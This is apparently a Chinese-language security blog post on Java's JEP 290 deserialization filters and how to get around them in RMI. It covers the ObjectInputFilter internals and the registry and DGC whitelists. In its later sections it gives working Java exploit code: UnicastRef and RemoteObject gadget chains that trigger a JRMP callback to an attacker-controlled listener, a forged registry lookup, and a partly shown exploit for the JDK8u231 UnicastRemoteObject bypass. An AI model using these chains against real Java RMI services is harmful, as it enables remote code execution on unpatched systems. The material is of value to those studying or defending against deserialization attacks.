<code>jdk.serialFilter</code> 或者 <code>%JAVA_HOME%\conf\security\java.security</code> 文件的 <code>jdk.serialFilter</code> 字段值，来设置 <code>Config.serialFilter</code> ，也就是设置了全局过滤。</p><p>另外还有就是一些框架，在开始的时候设置也会设置 <code>Config.serialFilter</code> ，来设置 <code>ObjectInputStream</code> 类的全局过滤。 weblogic 就是，在启动的时候会设置 <code>Config.serialFilter</code> 为 <code>WebLogicObjectInputFilterWrapper</code> 对象。</p><h2 id="Global-静态类"><a href="#Global-静态类" class="headerlink" title="Global 静态类"></a>Global 静态类</h2><p><code>Global</code> 静态类是 Config 类中的一个内部静态类。</p><p><code>Global</code> 类的一个重要特征是实现了 ``ObjectInputFilter<code>接口，实现了其中的</code>checkInput<code>方法。所以</code>Global<code>类可以直接赋值到</code>ObjectInputStream.serialFilter` 上。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231211756.png" alt="image-20230520231211756"></p><h3 id="Global-filters-字段"><a href="#Global-filters-字段" class="headerlink" title="Global#filters 字段"></a>Global#filters 字段</h3><p>是一个函数列表。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231253842.png" alt="image-20230520231253842"></p><h3 id="Global-checkInput-方法"><a href="#Global-checkInput-方法" class="headerlink" title="Global#checkInput 方法"></a>Global#checkInput 方法</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231327575.png" alt="image-20230520231327575"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231353991.png" alt="image-20230520231353991"></p><p><code>Global</code> 类的 <code>checkInput</code> 会遍历 <code>filters</code> 去检测要反序列化的类。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231407212.png" alt="image-20230520231407212"></p><h3 id="Global-中的构造函数"><a href="#Global-中的构造函数" class="headerlink" title="Global 中的构造函数"></a>Global 中的构造函数</h3><p>构造方法解析相关配置的JEP290规则语法，以<code>;</code>分割将其作为一个个规则，然后添加到 <code>Global.filters</code> 。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20211206184805162.png" alt="image-20211206184805162"></p><h3 id="Global-createFilter-方法"><a href="#Global-createFilter-方法" class="headerlink" title="Global#createFilter 方法"></a>Global#createFilter 方法</h3><p>传入规则字符串，来实例化一个 <code>Global</code> 对象。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520231703032.png" alt="image-20230520231703032"></p><h3 id="Global-类的总结"><a href="#Global-类的总结" class="headerlink" title="Global 类的总结"></a>Global 类的总结</h3><p><code>Global</code> 实现了<code>ObjectInputFilter</code>接口，所以是可以直接赋值到 <code>ObjectInputStream.serialFilter</code> 上。</p><p><code>Global#filters</code> 字段是一个函数列表。</p><p><code>Global</code> 类中的 <code>chekInput</code> 方法会遍历 <code>Global#filters</code> 的函数，传入需要检查的 <code>FilterValues</code>进行检查（<code>FilterValues</code> 中包含了要检查的 <code>class</code>, <code>arrayLength</code>，以及 <code>depth</code> 等）。</p><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p>在上面总结 <code>ObjectInputStream</code> 类的中说过，配置过滤器其实就是设置 <code>ObjectInputStream</code> 类中的 <code>serialFilter</code> 属性。</p><p>过滤器的类型有两种，第一种是通过配置文件或者 <code>JVM</code> 属性来配置的全局过滤器，第二种则是来通过改变 <code>ObjectInputStream</code> 的 <code>serialFilter</code> 属性来配置的局部过滤器。</p><h2 id="全局过滤器"><a href="#全局过滤器" class="headerlink" title="全局过滤器"></a>全局过滤器</h2><p>设置全局过滤器，其实就是设置<code>Config</code>静态类的 <code>serialFilter</code> 静态字段值。</p><p>具体原因是因为在 <code>ObjectInputStream</code> 的两个构造函数中，都会为 <code>serialFilter</code> 属性赋值为 <code>ObjectInputFilter.Config.getSerialFilter()</code> 。</p><p>而 <code>ObjectInputFilter.Config.getSerialFilter</code> 就是直接返回 <code>Config#serialFilter</code>：</p><h3 id="jdk-serailFilter"><a href="#jdk-serailFilter" class="headerlink" title="jdk.serailFilter"></a>jdk.serailFilter</h3><p>在介绍 <code>Config</code> 静态类的时候说到，<code>Config</code> 静态类初始化的时候，会解析 <code>jdk.serailFilter</code> 属性设置的 JEP 290 规则到一个 <code>Global</code> 对象的 <code>filters</code> 属性，并且会将这个 <code>Global</code> 对象赋值到 <code>Config</code> 静态类的 <code>serialFilter</code> 属性上。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520232123483.png" alt="image-20230520232123483"></p><p>所以，这里 <code>Config.serialFilter</code> 值默认是解析 <code>jdk.serailFilter</code> 属性得到得到的 <code>Global</code> 对象。</p><h2 id="局部过滤器"><a href="#局部过滤器" class="headerlink" title="局部过滤器"></a>局部过滤器</h2><p>设置局部过滤器的意思是在 <code>new</code> <code>objectInputStream</code> 对象之后，再通过改变单个 <code>ObjectInputStream</code> 对象的 <code>serialFilter</code>字段值来实现局部过滤。</p><p>改变单个 <code>ObjectInputStream</code> 对象的 <code>serialFilter</code> 字段是有两种方法：</p><p>1.通过调用 <code>ObjectInputStream</code> 对象的 <code>setInternalObjectInputFilter</code> 方法：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520232257747.png" alt="image-20230520232257747"></p><p>2.通过调用 <code>Config.setObjectInputFilter</code> ：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520232514705.png" alt="image-20230520232514705"></p><p>这个其实就是通过<code>setObjectInputFilter</code>调到<code>setInternalObjectInputFilter</code> 方法</p><p>局部过滤器典型的例子是 RMI 中针对 <code>RegsitryImpl</code> 和 <code>DGCImpl</code>有关的过滤。</p><h1 id="JEP-290对RMI的限制"><a href="#JEP-290对RMI的限制" class="headerlink" title="JEP 290对RMI的限制"></a>JEP 290对RMI的限制</h1><p>在没有JEP 290之前，我们RMI攻击的路线有</p><p>客户端攻击注册中心<br>服务端攻击注册中心<br>注册中心攻击客户端<br>服务端攻击客户端<br>客户端攻击服务端<br>DGC客户端攻击DGC服务端<br>DGC服务端攻击DGC客户端<br>JRMP服务端攻击JRMP客户端</p><p>接下来我们看一下JEP 290限制了什么</p><p>这里就不跟代码了，直接贴结果</p><p>1、RegistryImpl_Skel强制RegistryImpl.checkAccess验证<br>限制服务端和注册中心必须在同一host，相当于强制将服务端和注册中心绑定在一起，也就没有这两者之间的远程互相攻击了。<br>2、配置了registry过滤器<br>RegistryImpl_Skel里面的对象反序列化时会进行白名单校验，内容如下：</p><pre class="language-java" data-language="java"><code class="language-java">if (String.class &#x3D;&#x3D; clazz                 || java.lang.Number.class.isAssignableFrom(clazz)                 || Remote.class.isAssignableFrom(clazz)                 || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)                 || UnicastRef.class.isAssignableFrom(clazz)                 || RMIClientSocketFactory.class.isAssignableFrom(clazz)                 || RMIServerSocketFactory.class.isAssignableFrom(clazz)                 || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)                 || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;             return ObjectInputFilter.Status.ALLOWED;         &#125; else &#123;             return ObjectInputFilter.Status.REJECTED;         &#125;</code></pre><p>也就是白名单有</p><p>String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID</p><p>只要反序列化的类不是白名单中的类，就会返回 REJECTED 操作符，表示序列化流中有不合法的内容，直接抛出异常。</p><p>没有任何一条完整的反序列化攻击链能通过这个白名单，这样前面攻击注册中心的方法都失效了。<br><strong>但RegistryImpl_Stub里面的方法没有过滤，毕竟为了功能正常使用是没办法白名单的，所以注册中心攻击客户端依然可行。</strong></p><p><strong>3、配置了DGC过滤器</strong></p><p>DGC里的白名单校验更加严格</p><p>DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验，内容如下：</p><pre class="language-java" data-language="java"><code class="language-java">return (clazz &#x3D;&#x3D; ObjID.class ||                 clazz &#x3D;&#x3D; UID.class ||                 clazz &#x3D;&#x3D; VMID.class ||                 clazz &#x3D;&#x3D; Lease.class)                 ? ObjectInputFilter.Status.ALLOWED                 : ObjectInputFilter.Status.REJECTED;</code></pre><p>这相当于直接断了攻击DGC的路</p><p>所以现在，我们还有的攻击路线是</p><p>客户端攻击服务端<br>服务端攻击客户端<br>注册中心攻击客户端<br>JRMP服务端攻击JRMP客户端</p><p>这四种都是不用变的，但是我们想绕过JEP 290的限制应该怎么做呢？</p><h1 id="RMI里的反序列化"><a href="#RMI里的反序列化" class="headerlink" title="RMI里的反序列化"></a>RMI里的反序列化</h1><p>既然JEP 290限制了我们反序列化的类，那我们就需要去找这里可以利用的类如何进行反序列化</p><h2 id="1-UnicastRemoteObject"><a href="#1-UnicastRemoteObject" class="headerlink" title="1. UnicastRemoteObject"></a>1. UnicastRemoteObject</h2><p><code>java.rmi.server.UnicastRemoteObject</code> 类通常是远程调用接口实现类的父类，或直接使用其静态方法 <code>exportObject</code> 来创建动态代理并随机监听本机端口以提供服务。</p><p>因此不难理解，在反序列化此类以及其子类后，依旧需要执行 <code>exportObject</code> 的相关操作，直接来看一下 UnicastRemoteObject 的 <code>readObject</code> 方法：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521161051772.png" alt="image-20230521161051772"></p><p>执行了reexport，又执行了 <code>exportObject</code> 方法。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521161121475.png" alt="image-20230521161121475"></p><p>所以UnicastRemoteObject这个类进行反序列化的时候，就相当于成为了一个JRMP的服务端，然后如果存在恶意的JRMP客户端，就有可能被攻击。</p><p><del>感觉这玩意怪鸡肋的，可能是我水平的问题，感觉和JRMPListener不是很像。JRMPListener是通过恶意JRMP服务端打客户端，但是这个是让自己监听自己的端口，相当于一个服务端，</del></p><p>想了一下，可能是通过UnicastRemoteObject的反序列化，然后让被攻击端发起一个网络请求，变成一个JRMP服务端，然后我们就可以通过恶意的客户端去进行攻击了。UnicastRemoteObject也是Remote的子类，所以能进行反序列化不受影响。但是仅凭这玩意没法绕过JEP 290，因为最主要的还是恶意客户端攻击的时候传的payload</p><h2 id="2-UnicastRef"><a href="#2-UnicastRef" class="headerlink" title="2. UnicastRef"></a>2. UnicastRef</h2><p><code>sun.rmi.server.UnicastRef</code> 类实现了 Externalizable 接口，因此在其反序列化时，会调用其 <code>readExternal</code> 方法执行额外的逻辑。</p><p>UnicastRef 的 <code>readExternal</code> 方法调用 <code>LiveRef.read(var1, false)</code> 方法来还原成员变量 <code>LiveRef ref</code> 属性。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165213006.png" alt="image-20230521165213006"></p><p>LiveRef 的 <code>read</code> 方法在创建 LiveRef 对象后，调用 DGCClient 的 registerRefs 方法来将其在环境中进行注册。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165339304.png" alt="image-20230521165339304"></p><p>调用 <code>DGCClient$EndpointEntry#registerRefs</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165410161.png" alt="image-20230521165410161"></p><p>继续调用 <code>makeDirtyCall</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165532081.png" alt="image-20230521165532081"></p><p>然后就会调用dgc的dirty方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521165621111.png" alt="image-20230521165621111"></p><p>因此可以看出，在 UnicastRef 进行反序列化时，会触发 DGC 通信及 dirty 方法调用，此时如果与一个恶意服务通信，返回恶意数据流，则会造成反序列化漏洞。</p><p>poc</p><pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception &#123;    String host &#x3D; &quot;127.0.0.1&quot;;    int    port &#x3D; 12233;    ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry    TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);    UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));    ser(ref);    unser();&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521170202429.png" alt="image-20230521170202429"></p><h2 id="3-RemoteObject"><a href="#3-RemoteObject" class="headerlink" title="3. RemoteObject"></a>3. RemoteObject</h2><p>RemoteObject 是几乎所有 RMI 远程调用类的父类。这个类也可以用来触发反序列化漏洞。</p><p>RemoteObject 的 readObject 方法会先反序列化成员变量 <code>RemoteRef ref</code> ，最后调用其 readExternal 方法，可以用来触发上一条 UnicastRef 链。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1633660408218.png" alt="1633660408218"></p><p>因此我们随便找一个 RemoteObject 的子类，在其实例中放入 UnicastRef 对象，反序列化时均可触发利用链。例如如下利用代码，</p><pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception &#123;    String host &#x3D; &quot;127.0.0.1&quot;;    int    port &#x3D; 12233;    ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry    TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);    UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));    RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref);    ser(stub);    unser();&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521170839576.png" alt="image-20230521170839576"></p><h1 id="绕过JEP-290"><a href="#绕过JEP-290" class="headerlink" title="绕过JEP 290"></a>绕过JEP 290</h1><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20211201211404548.png" alt="image-20211201211404548"></p><p>根据我们前面说的，我们可以得到这样一个绕过JEP 290的方法</p><p>首先借助RMI原生的、且在白名单里的类，将其作为客户端的参数，然后在注册中心进行反序列化读取的时候，触发JRMP请求，我们可以规定向我们的恶意JRMP服务端进行请求，这样就可以实现对JEP 290的绕过</p><p>服务端代码不变</p><p>客户端为</p><pre class="language-java" data-language="java"><code class="language-java">public class RMIClient &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1098);        &#x2F;&#x2F;unicastref构造反序列化        String host &#x3D; &quot;127.0.0.1&quot;;        int    port &#x3D; 12233;        ObjID id  &#x3D; new ObjID(new Random().nextInt()); &#x2F;&#x2F; RMI registry        TCPEndpoint te  &#x3D; new TCPEndpoint(host, port);        UnicastRef ref1 &#x3D; new UnicastRef(new LiveRef(id, te, false));        RMIServerImpl_Stub stub &#x3D; new RMIServerImpl_Stub(ref1);        &#x2F;&#x2F;获取ref        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);        declaredField.setAccessible(true);        RemoteRef ref0 &#x3D; (RemoteRef)declaredField.get(registry);        &#x2F;&#x2F;获取 operations        Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);        operations_field.setAccessible(true);        Operation[] operations &#x3D; (Operation[])operations_field.get(registry);&#x2F;&#x2F;伪造lookup        RemoteCall var2 &#x3D; ref0.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);        ObjectOutput var3 &#x3D; var2.getOutputStream();        var3.writeObject(stub);        ref0.invoke(var2);    &#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521181302761.png" alt="image-20230521181302761"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521181134141.png" alt="image-20230521181134141"></p><h1 id="JDK8u231"><a href="#JDK8u231" class="headerlink" title="JDK8u231"></a>JDK8u231</h1><p>没环境了，照抄了（</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>而在jdk8u231中，RMI又增加了新的安全措施。<br>首先是对注册中心进行了加固，更新后的RegistryImpl_Skel#dispatch</p><pre class="language-java" data-language="java"><code class="language-java">case 2: &#x2F;&#x2F; lookup(String)&#123;    java.lang.String $param_String_1;    try &#123;        java.io.ObjectInput in &#x3D; call.getInputStream();        $param_String_1 &#x3D; (java.lang.String) in.readObject();    &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;        call.discardPendingRefs();        throw new java.rmi.UnmarshalException(&quot;error unmarshalling arguments&quot;, e);    &#125; finally &#123;        call.releaseInputStream();    &#125;    java.rmi.Remote $result &#x3D; server.lookup($param_String_1);    try &#123;        java.io.ObjectOutput out &#x3D; call.getResultStream(true);        out.writeObject($result);    &#125; catch (java.io.IOException e) &#123;        throw new java.rmi.MarshalException(&quot;error marshalling return&quot;, e);    &#125;    break;&#125;......</code></pre><p>可以和8u231之前的比较一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182330772.png" alt="image-20230521182330772"></p><p>其实就多了一行<code> call.discardPendingRefs();</code>,但是这个方法会在反序列化出错之后把incomingRefTable清空。那么在ConnectionInputStream#registerRefs就进不去ConnectionInputStream#registerRefs了。而且由于我们是自己重写的lookup，传的是个Object类型而不是String，所以在强转的时候一定会进catch里的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182655046.png" alt="image-20230521182655046"></p><p>还有一处修复在DGCImpl_Stub</p><pre class="language-java" data-language="java"><code class="language-java">public void clean(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.VMID $param_VMID_3, boolean $param_boolean_4)            throws java.rmi.RemoteException &#123;        try &#123;            StreamRemoteCall call &#x3D; (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,                    operations, 0, interfaceHash);            call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);            try &#123;                java.io.ObjectOutput out &#x3D; call.getOutputStream();                out.writeObject($param_arrayOf_ObjID_1);                out.writeLong($param_long_2);                out.writeObject($param_VMID_3);                out.writeBoolean($param_boolean_4);            &#125; catch (java.io.IOException e) &#123;                throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);            &#125;            ref.invoke(call);            ref.done(call);        &#125; catch (java.lang.RuntimeException e) &#123;            throw e;        &#125; catch (java.rmi.RemoteException e) &#123;            throw e;        &#125; catch (java.lang.Exception e) &#123;            throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);        &#125;    &#125;    &#x2F;&#x2F; implementation of dirty(ObjID[], long, Lease)    public java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[] $param_arrayOf_ObjID_1, long $param_long_2, java.rmi.dgc.Lease $param_Lease_3)            throws java.rmi.RemoteException &#123;        try &#123;            StreamRemoteCall call &#x3D;                    (StreamRemoteCall)ref.newCall((java.rmi.server.RemoteObject) this,                            operations, 1, interfaceHash);            call.setObjectInputFilter(DGCImpl_Stub::leaseFilter);            try &#123;                java.io.ObjectOutput out &#x3D; call.getOutputStream();                out.writeObject($param_arrayOf_ObjID_1);                out.writeLong($param_long_2);                out.writeObject($param_Lease_3);            &#125; catch (java.io.IOException e) &#123;                throw new java.rmi.MarshalException(&quot;error marshalling arguments&quot;, e);            &#125;            ref.invoke(call);            java.rmi.dgc.Lease $result;            Connection connection &#x3D; call.getConnection();            try &#123;                java.io.ObjectInput in &#x3D; call.getInputStream();                $result &#x3D; (java.rmi.dgc.Lease) in.readObject();            &#125; catch (ClassCastException | IOException | ClassNotFoundException e) &#123;                if (connection instanceof TCPConnection) &#123;                    &#x2F;&#x2F; Modified to prevent re-use of the connection after an exception                    ((TCPConnection) connection).getChannel().free(connection, false);                &#125;                call.discardPendingRefs();                throw new java.rmi.UnmarshalException(&quot;error unmarshalling return&quot;, e);            &#125; finally &#123;                ref.done(call);            &#125;            return $result;        &#125; catch (java.lang.RuntimeException e) &#123;            throw e;        &#125; catch (java.rmi.RemoteException e) &#123;            throw e;        &#125; catch (java.lang.Exception e) &#123;            throw new java.rmi.UnexpectedException(&quot;undeclared checked exception&quot;, e);        &#125;    &#125;</code></pre><p>和之前的比一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521182935214.png" alt="image-20230521182935214"></p><p>可以看到它把setObjectInputFilter方法提前了，在旧版本中，我们攻击JRMP客户端的时候直接调用了ref.invoke(call);去触发反序列化，对于后面的过滤器可以不用考虑，但是现在过滤器在我们的反序列化之前了。</p><p>这对于之前的JRMP攻击方式来说都是致命的</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>从前面的分析可以知道，如果想在不知道远程接口的情况想攻击注册中心/服务端，目前能控制的最大范围就是注册中心和DGC的filter里面限制的几个类。</p><p>这里绕过思路很容易想到，思路大致是：在<code>RegistryImpl_Skel#dispatch</code>反序列化时(还没反序列化完，绕过报错)，在这里就发出JRMP请求，不需要后面的releaseInputStream，同时也不需要在DGC客户端的ConnectionInputStream中完成readObject，而是另起一道来执行(绕过DGC层过滤)。</p><p>但是真正去找这么一条利用链是很困难的。我们要先看一下白名单有哪些可以用：<br>1、RegistryImpl_Skel，允许Remote/UnicastRef/RMIClientSocketFactory/RMIServerSocketFactory/ActivationID/UID<br>2、DGCImpl_Skel，允许ObjID/UID/VMID/Lease<br>看看这些类哪些是可以序列化并且重写了readObject/readExternal之类改变调用流程的，找了下有这些：<br>UnicastRef<br>UnicastRef2<br>UnicastServerRef<br>ActivationID<br>RemoteObject<br>UnicastRemoteObject</p><p>这里我直接说了，在JDK8u231的情况下，采用的是UnicastRemoteObject实现的反序列化绕过</p><p>这是一条由国外的An Trinh师傅提出来的攻击方法，原文在[这篇文章][An Trinhs RMI Registry Bypass | MOGWAI LABS<a href="https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)]%E9%87%8C">https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/)]里</a></p><p>这个payload会在<strong>readobject函数调用过程</strong>直接触发JRMP请求</p><p>在8u231之前，我们的反序列化攻击的流程是</p><ol><li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li><li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li><li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li></ol><p>而An Trinh这条利用链的攻击流程是</p><ol><li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li><li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，An Trinh的Gadgets会在这里触发一次JRMP请求</strong></li><li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li></ol><p>这个利用链的开始点是UnicastRemoteObject的readObject方法。和我们之前说的在RMI里的反序列化那章的UnicastRemoteObject不同，这里在调用reexport后，对ssf进行了填充</p><p>因此会进入else里的exportObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204325976.png" alt="image-20230521204325976"></p><p>然后遇见exportObject就往里跟，最后会发现调用了TCPTransport的exportObject方法，其中又调用了listen方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204524317.png" alt="image-20230521204524317"></p><p>listen里调用了TCPEndpoint类的newServerSocket方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204702729.png" alt="image-20230521204702729"></p><p>在这里，他调用了我们ssf的createServerSocket方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521204831307.png" alt="image-20230521204831307"></p><p>那假如我们这里的ssf是个代理类，就可以先进入代理类的invoke方法了</p><p>要知道，我们绕这么一大圈，最后还是要走UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端这条路</p><p>这里的这个代理类就是RemoteObjectInvocationHandler</p><p>为什么选这个类呢，因为重载了我们之前用的UnicastRef的invoke方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521210125014.png" alt="image-20230521210125014"></p><p>在重载后的这个invoke里，同样调用了executeCall</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521205832911.png" alt="image-20230521205832911"></p><p>从分析里就能看出来，这个只需要把ssf设置成一个代理RMIServerSocketFactory接口的动态代理，里面放RemoteObjectInvocationHandler，调用这里时最终就触发了executeCall</p><p>不过在在之后还有一个问题</p><p>就是在RegistryImpl_Stub的方法里调用了writeObject，而writeObject里有个判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230521230608649.png" alt="image-20230521230608649"></p><p>如果enableReplace为true。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/t010c68f5a4abd1ff40.png" alt="img"></p><p>检测我们要序列化的obj，是否实现Remote/RemoteStub，由于UnicastRemoteObject实现了Remote，没有实现RemoteStub，于是会进入判断，就会替换我们的obj，以至于反序列化的时候不能还原我们构造的类。</p><p>所以，需要把enableReplace改为false。</p><p>（这是<a href="https://www.anquanke.com/post/id/211722#h3-5%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9B%BE%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E6%9C%AC%E5%9C%B0%E7%9A%848u231%E7%89%88%E6%9C%AC%E9%87%8C%E7%9A%84writeObject%E5%B9%B6%E4%B8%8D%E9%95%BF%E8%BF%99%E6%A0%B7%EF%BC%8C%E8%80%8C%E4%B8%94%E8%B0%83%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99enableReplace%E6%9C%AC%E6%9D%A5%E5%B0%B1%E6%98%AFfalse%EF%BC%8C%E5%BE%88%E6%80%AA%EF%BC%8C%E4%BD%86%E6%98%AF%E7%94%B1%E4%BA%8E%E6%B2%A1%E6%9C%89%E6%89%BE%E5%88%B0%E5%8E%9F%E5%9B%A0%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E9%80%89%E6%8B%A9%E7%9B%B8%E4%BF%A1%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9B%A0%E4%B8%BA%E6%88%91%E6%B2%A1%E6%9C%89231%E7%9A%84%E6%BA%90%E7%A0%81%E6%89%80%E4%BB%A5%E8%B0%83%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99%E5%87%BA%E4%BA%86%E7%82%B9%E9%97%AE%E9%A2%98">https://www.anquanke.com/post/id/211722#h3-5这篇文章的代码图，但是我本地的8u231版本里的writeObject并不长这样，而且调试的时候enableReplace本来就是false，很怪，但是由于没有找到原因，所以我选择相信这篇文章，可能是因为我没有231的源码所以调试的时候出了点问题</a></p><p>抄一个exp，这个原本是重写了bind方法的，我试着重写了lookup方法，也能触发</p><pre class="language-java" data-language="java"><code class="language-java">public class BypassJEP290ByUnicastRemoteObject &#123;    public static void main(String[] args) throws Exception &#123;        UnicastRemoteObject payload &#x3D; getPayload();        Registry registry &#x3D; LocateRegistry.getRegistry(1098);&#x2F;&#x2F;        bindReflection(&quot;pwn&quot;, payload, registry);        lookupReflection(payload, registry);    &#125;    static UnicastRemoteObject getPayload() throws Exception &#123;        ObjID id &#x3D; new ObjID(new Random().nextInt());        TCPEndpoint te &#x3D; new TCPEndpoint(&quot;localhost&quot;, 12233);        UnicastRef ref &#x3D; new UnicastRef(new LiveRef(id, te, false));        System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);        RemoteObjectInvocationHandler handler &#x3D; new RemoteObjectInvocationHandler(ref);        RMIServerSocketFactory factory &#x3D; (RMIServerSocketFactory) Proxy.newProxyInstance(                handler.getClass().getClassLoader(),                new Class[]&#123;RMIServerSocketFactory.class, Remote.class&#125;,                handler        );        Constructor&lt;UnicastRemoteObject&gt; constructor &#x3D; UnicastRemoteObject.class.getDeclaredConstructor();        constructor.setAccessible(true);        UnicastRemoteObject unicastRemoteObject &#x3D; constructor.newInstance();        Field field_ssf &#x3D; UnicastRemoteObject.class.getDeclaredField(&quot;ssf&quot;);        field_ssf.setAccessible(true);        field_ssf.set(unicastRemoteObject, factory);        return unicastRemoteObject;    &#125;    static void bindReflection(String name, Object obj, Registry registry) throws Exception &#123;        Field ref_filed &#x3D; RemoteObject.class.getDeclaredField(&quot;ref&quot;);        ref_filed.setAccessible(true);        UnicastRef ref &#x3D; (UnicastRef) ref_filed.get(registry);        Field operations_filed &#x3D; RegistryImpl_Stub.class.getDeclaredField(&quot;operations&quot;);        operations_filed.setAccessible(true);        Operation[] operations &#x3D; (Operation[]) operations_filed.get(registry);        RemoteCall remoteCall &#x3D; ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);        ObjectOutput outputStream 